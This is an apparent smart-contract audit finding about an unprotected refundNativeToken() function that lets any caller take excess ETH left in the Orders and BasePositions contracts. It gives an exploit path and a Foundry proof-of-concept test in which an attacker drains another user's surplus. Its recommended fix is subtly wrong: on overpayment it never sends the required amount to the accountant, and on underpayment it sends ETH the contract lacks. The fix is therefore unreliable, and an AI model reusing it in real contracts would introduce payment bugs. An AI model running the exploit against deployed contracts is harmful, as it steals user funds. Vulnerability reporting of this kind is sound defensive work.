## Title
Excess Native Token Theft via Unprotected refundNativeToken() in Orders and BasePositions

## Summary
When users send excess ETH to Orders.sol or BasePositions contracts (msg.value > required amount), the surplus remains in the contract balance. The inherited `refundNativeToken()` function has no access control, allowing any attacker to steal accumulated excess ETH from all users by simply calling this public function.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/base/PayableMulticallable.sol` (lines 25-29), inherited by `src/Orders.sol` and `src/base/BasePositions.sol` [1](#0-0) 

**Intended Logic:** The `refundNativeToken()` function is designed to allow users to recover excess ETH sent for "transient payments" in multicall batches. Users are expected to include this call in the same transaction to reclaim any unused ETH.

**Actual Logic:** The function lacks access control and sends ALL contract balance to `msg.sender`, regardless of who originally sent the ETH. Unlike Router.sol which automatically refunds excess ETH within the same transaction, Orders.sol and BasePositions.sol simply leave excess ETH in the contract. [2](#0-1) [3](#0-2) 

Compare to Router.sol which implements secure automatic refund logic: [4](#0-3) 

**Exploitation Path:**
1. **Alice** calls `Orders.increaseSellAmount{value: 10 ETH}()` intending to create a TWAMM order, but the actual requirement calculated by `CORE.updateSaleRate()` is only 9.5 ETH
2. Orders.sol transfers 9.5 ETH to ACCOUNTANT via `SafeTransferLib.safeTransferETH(address(ACCOUNTANT), 9.5 ETH)`, leaving 0.5 ETH in Orders contract
3. **Bob** (attacker) monitors `Orders.balance` and observes the 0.5 ETH accumulation (could also be from multiple users)
4. **Bob** calls `Orders.refundNativeToken()` and receives the entire balance (0.5 ETH) that belonged to Alice

**Security Property Broken:** Direct theft of user funds - violates the fundamental security expectation that user assets remain under their control unless explicitly transferred.

## Impact Explanation
- **Affected Assets**: Native ETH sent to Orders and BasePositions contracts
- **Damage Severity**: 100% loss of excess ETH for affected users. Any user who sends more ETH than required loses the surplus to the first attacker who calls `refundNativeToken()`. Since the function sends the ENTIRE contract balance, an attacker can accumulate theft across multiple users.
- **User Impact**: Any user who:
  - Sends excess ETH for safety/uncertainty about exact amount needed
  - Doesn't call `refundNativeToken()` in the same multicall transaction
  - Uses single transaction calls instead of multicall
  - Is front-run when trying to call `refundNativeToken()` themselves

## Likelihood Explanation
- **Attacker Profile**: Any external actor who can monitor contract balances and submit transactions
- **Preconditions**: 
  - Users send excess ETH to Orders or BasePositions (highly likely due to calculation complexity for sale rates and rounding)
  - Users don't call `refundNativeToken()` in same transaction (likely if undocumented or users unaware)
- **Execution Complexity**: Trivial - single function call `refundNativeToken()` with no parameters
- **Frequency**: Continuously exploitable. Attacker can monitor mempool and front-run legitimate refund attempts, or simply extract whenever `contract.balance > 0`

## Recommendation

Add proper access control or implement automatic refund logic similar to Router:

```solidity
// In src/Orders.sol, function handleLockData, after line 151:

// CURRENT (vulnerable):
if (saleRateDelta > 0) {
    if (sellToken == NATIVE_TOKEN_ADDRESS) {
        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint256(amount));
    } else {
        ACCOUNTANT.payFrom(recipientOrPayer, sellToken, uint256(amount));
    }
}

// FIXED:
if (saleRateDelta > 0) {
    if (sellToken == NATIVE_TOKEN_ADDRESS) {
        // Calculate excess ETH to refund
        int256 valueDifference = int256(msg.value) - int256(uint256(amount));
        
        // If we received more than needed, refund the excess immediately
        if (valueDifference > 0) {
            ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, recipientOrPayer, uint128(uint256(valueDifference)));
        } else if (valueDifference < 0) {
            // If we received less than needed, pull the difference
            SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-valueDifference)));
        }
        // If exact amount, transfer it all
        if (valueDifference == 0) {
            SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint256(amount));
        }
    } else {
        ACCOUNTANT.payFrom(recipientOrPayer, sellToken, uint256(amount));
    }
}
```

Alternative: Remove `refundNativeToken()` entirely and require exact payment amounts, reverting on excess.

## Proof of Concept

```solidity
// File: test/Exploit_ExcessETHTheft.t.sol
// Run with: forge test --match-test test_ExcessETHTheft -vvv

pragma solidity ^0.8.31;

import "forge-std/Test.sol";
import "../src/Orders.sol";
import "../src/Core.sol";
import "../src/extensions/TWAMM.sol";
import {OrderKey, createOrderConfig} from "../src/types/orderKey.sol";
import {MockERC20} from "./mocks/MockERC20.sol";

contract Exploit_ExcessETHTheft is Test {
    Orders orders;
    Core core;
    TWAMM twamm;
    MockERC20 token0;
    MockERC20 token1;
    address alice = address(0xA11CE);
    address bob = address(0xB0B);
    
    function setUp() public {
        // Initialize protocol (simplified setup)
        core = new Core(address(this));
        twamm = new TWAMM();
        orders = new Orders(core, twamm, address(this));
        
        token0 = new MockERC20();
        token1 = new MockERC20();
        
        // Fund alice with ETH
        vm.deal(alice, 100 ether);
        vm.deal(bob, 1 ether);
    }
    
    function test_ExcessETHTheft() public {
        // SETUP: Alice wants to create a TWAMM order
        vm.startPrank(alice);
        
        OrderKey memory key = OrderKey({
            token0: address(0), // NATIVE_TOKEN_ADDRESS
            token1: address(token1),
            config: createOrderConfig({
                _fee: 0,
                _isToken1: false,
                _startTime: uint64(block.timestamp),
                _endTime: uint64(block.timestamp + 1000)
            })
        });
        
        // Alice sends 10 ETH but only 9.5 ETH is needed
        // (In reality, the exact amount needed is hard to predict)
        uint256 aliceBalanceBefore = alice.balance;
        orders.mintAndIncreaseSellAmount{value: 10 ether}(
            key,
            9.5 ether, // amount parameter
            type(uint112).max
        );
        uint256 aliceBalanceAfter = alice.balance;
        
        // Verify Alice sent 10 ETH
        assertEq(aliceBalanceBefore - aliceBalanceAfter, 10 ether, "Alice sent 10 ETH");
        
        // Verify 0.5 ETH remains in Orders contract
        assertEq(address(orders).balance, 0.5 ether, "0.5 ETH stuck in Orders");
        
        vm.stopPrank();
        
        // EXPLOIT: Bob notices the stuck ETH and steals it
        vm.prank(bob);
        uint256 bobBalanceBefore = bob.balance;
        orders.refundNativeToken();
        uint256 bobBalanceAfter = bob.balance;
        
        // VERIFY: Bob successfully stole Alice's excess ETH
        assertEq(bobBalanceAfter - bobBalanceBefore, 0.5 ether, "Vulnerability confirmed: Bob stole Alice's 0.5 ETH");
        assertEq(address(orders).balance, 0, "Orders balance emptied");
    }
}
```

## Notes

1. **Root Cause**: Orders and BasePositions inherit PayableMulticallable but don't implement the same automatic refund logic that Router.sol has. This creates an inconsistent security model within the protocol.

2. **Affected Contracts**: Both `Orders.sol` and `BasePositions.sol` are vulnerable as they inherit `PayableMulticallable` and handle native token payments without automatic refunds.

3. **Flash Accounting Invariant**: The original question asked if excess ETH violates the flash accounting invariant. The answer is NO - excess ETH remains in the Orders/BasePositions contracts (not ACCOUNTANT), and flash accounting balances correctly. However, the lack of refund protection creates a separate HIGH severity vulnerability.

4. **Design Inconsistency**: Router.sol correctly implements automatic refunds via `ACCOUNTANT.withdraw()` when `valueDifference > 0`, but Orders and BasePositions do not follow this pattern, creating an exploitable gap.

### Citations

**File:** src/base/PayableMulticallable.sol (L25-29)
```text
    function refundNativeToken() external payable {
        if (address(this).balance != 0) {
            SafeTransferLib.safeTransferETH(msg.sender, address(this).balance);
        }
    }
```

**File:** src/Orders.sol (L146-151)
```text
                if (saleRateDelta > 0) {
                    if (sellToken == NATIVE_TOKEN_ADDRESS) {
                        SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint256(amount));
                    } else {
                        ACCOUNTANT.payFrom(recipientOrPayer, sellToken, uint256(amount));
                    }
```

**File:** src/base/BasePositions.sol (L256-258)
```text
                if (amount0 != 0) {
                    SafeTransferLib.safeTransferETH(address(ACCOUNTANT), amount0);
                }
```

**File:** src/Router.sol (L135-142)
```text
                            int256 valueDifference = int256(value) - int256(balanceUpdate.delta0());

                            // refund the overpaid ETH to the swapper
                            if (valueDifference > 0) {
                                ACCOUNTANT.withdraw(NATIVE_TOKEN_ADDRESS, swapper, uint128(uint256(valueDifference)));
                            } else if (valueDifference < 0) {
                                SafeTransferLib.safeTransferETH(address(ACCOUNTANT), uint128(uint256(-valueDifference)));
                            }
```
